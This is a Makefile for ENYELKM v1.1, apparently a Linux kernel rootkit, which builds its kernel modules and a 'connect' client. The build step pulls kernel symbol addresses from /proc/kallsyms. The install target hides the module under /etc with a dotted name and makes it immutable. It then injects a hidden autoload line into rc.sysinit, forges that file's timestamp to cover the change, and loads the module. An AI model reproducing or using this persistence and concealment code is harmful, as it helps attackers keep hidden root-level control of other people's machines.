obj-m += enyelkm.o
enyelkm-objs := base.o kill.o ls.o read.o remoto.o
DELKOS = base.ko kill.ko ls.ko read.ko remoto.ko
S_ENT = 0x`grep sysenter_entry /proc/kallsyms | head -c 8`
D_FORK = 0x`grep do_fork /proc/kallsyms | head -c 8`
VERSION = v1.1
CC = gcc

all:
	@echo
	@echo "-----------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe"
	@echo " raise@enye-sec.org | www.enye-sec.org"
	@echo "-----------------------------------------"
	@echo
	@echo "#define DSYSENTER $(S_ENT)" > data.h
	@echo "#define DOFORK $(D_FORK)" >> data.h
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) modules
	$(CC) connect.c -o connect -Wall
	@rm -f $(DELKOS)

connect:
	@echo
	@echo "-----------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe"
	@echo " raise@enye-sec.org | www.enye-sec.org"
	@echo "-----------------------------------------"
	@echo
	$(CC) connect.c -o connect -Wall
	@echo

install:
	@echo
	@echo "-----------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe"
	@echo " raise@enye-sec.org | www.enye-sec.org"
	@echo "-----------------------------------------"
	@echo
	@cp -f enyelkm.ko /etc/.enyelkmHIDE^IT.ko
	@chattr +i /etc/.enyelkmHIDE^IT.ko > /dev/null 2> /dev/null
	@echo -e "#<HIDE_8762>\ninsmod /etc/.enyelkmHIDE^IT.ko" \
		\ " > /dev/null 2> /dev/null\n#</HIDE_8762>" \
		\ >> /etc/rc.d/rc.sysinit
	@touch -r /etc/rc.d/rc /etc/rc.d/rc.sysinit > /dev/null 2> /dev/null
	@insmod /etc/.enyelkmHIDE^IT.ko
	@echo + enyelkm.ko copy to /etc/.enyelkmHIDE^IT.ko
	@echo + autoload hidden string installed on /etc/rc.d/rc.sysinit
	@echo + enyelkm loaded !
	@echo 

clean:
	@echo
	@echo "-----------------------------------------"
	@echo " ENYELKM $(VERSION) by RaiSe"
	@echo " raise@enye-sec.org | www.enye-sec.org"
	@echo "-----------------------------------------"
	@echo
	@rm -rf *.o *.ko *.mod.c .*.cmd data.h connect .tmp_versions
	make -C /lib/modules/$(shell uname -r)/build SUBDIRS=$(PWD) clean

